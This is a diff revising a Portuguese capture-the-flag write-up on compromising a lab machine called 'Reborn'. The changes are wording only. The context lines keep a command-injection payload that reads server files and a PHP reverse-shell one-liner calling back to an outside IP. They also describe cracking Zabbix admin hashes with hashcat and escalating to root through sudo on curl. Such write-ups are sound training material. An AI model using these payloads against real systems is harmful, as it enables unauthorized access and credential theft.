@@ -4,7 +4,7 @@
 
 ## Sumário
 
-A máquina REBORN apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de `command injection` no aplicativo web. A exploração inicial permitiu executar comandos no servidor e, a partir daí, acessar o banco de dados do `Zabbix`. No banco foi possível extrair as credenciais do administrador do painel web, o que levou à autenticação no painel administrativo do Zabbix. Com acesso ao painel/credenciais, foi estabelecida uma shell reversa que concedeu controle interativo sobre a máquina como o usuário que roda o serviço do Zabbix. Esse usuário tinha uma configuração sensível: permissão de sudo para executar o `curl` — um privilégio que foi usado como vetor para elevar privilégios e alcançar acesso root. Ao final, o atacante conseguiu controle total do sistema e do painel de monitoramento, podendo ler credenciais, modificar configurações e implantar mecanismos de persistência. Essa máquina ilustra bem como uma falha aparentemente localizada (validação de entrada insuficiente levando a command injection) pode ser encadeada — via acesso a banco de dados, credenciais expostas e configurações de sudo permissivas — até um comprometimento completo do ambiente de monitoramento.
+Um vetor de ataque que começou com uma vulnerabilidade de `command injection` no aplicativo web. A exploração inicial permitiu executar comandos no servidor e, a partir daí, acessar o banco de dados do `Zabbix`. No banco foi possível extrair as credenciais do administrador do painel web, o que levou à autenticação no painel administrativo do Zabbix. Com acesso ao painel/credenciais, foi estabelecida uma shell reversa que concedeu controle interativo sobre a máquina como o usuário que roda o serviço do Zabbix. Esse usuário tinha uma configuração sensível: permissão de sudo para executar o `curl` — um privilégio que foi usado como vetor para elevar privilégios e alcançar acesso `root`.
 
 ## Descoberta de aplicativo web
 
@@ -36,7 +36,7 @@ nmap -sC -sV -oA reborn.hc
 
 ### Fuzzing de diretórios
 
-Vamos realizar a enumeração de hosts virtuais para descobrir subdomínios ocultos:
+Realizamos a enumeração de hosts virtuais para descobrir subdomínios ocultos:
 
 ```bash
 ffuf -w /path/to/wordlists -u http://reborn.hc/FUZZ
@@ -66,7 +66,7 @@ http://127.0.0.1;curl file:///var/www/html/index.php
 
 ### Analisando o conteúdo do arquivo index.php
 
-Analisando as primeiras linhas de código, percebemos que a variável `$expertMode` é acessível através da URL se o parâmetro GET `expertMode` existir e se seu valor for exatamente **tcp**.
+Analisando as primeiras linhas de código, percebemos que a variável `$expertMode` é acessível através da URL se o parâmetro GET `expertMode` existir e se seu valor for exatamente `tcp`.
 
 ![URL snippet](/images/hackingclub-reborn/file-reborn-2025-4.png)  
 ![Expert Mode](/images/hackingclub-reborn/file-reborn-2025-5.png)
@@ -88,19 +88,19 @@ php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
 
 ## Zabbix
 
-Acessando arquivo de configuração do banco de dados Zabbix.
+1 - Acessando arquivo de configuração do banco de dados Zabbix.
 
 ![Zabbix configuration](/images/hackingclub-reborn/file-reborn-2025-8.png)
 
-Credenciais de acesso ao banco de dados rodando localmente.
+2 - Credenciais de acesso ao banco de dados rodando localmente.
 
 ![Zabbix credentials](/images/hackingclub-reborn/file-reborn-2025-9.png)
 
-Query SQL na tabela users para obter credenciais de administrador.
+3 - Query SQL na tabela users para obter credenciais de administrador.
 
 ![Users table](/images/hackingclub-reborn/file-reborn-2025-10.png)
 
-Hash do tipo Bcrypt. Utilizamos o módulo 3200 do hashcat para quebrar a senha.
+4 - Hash do tipo Bcrypt. Utilizamos o módulo 3200 do hashcat para quebrar a senha.
 
 ```bash
 hashcat -m 3200 hash wordlist
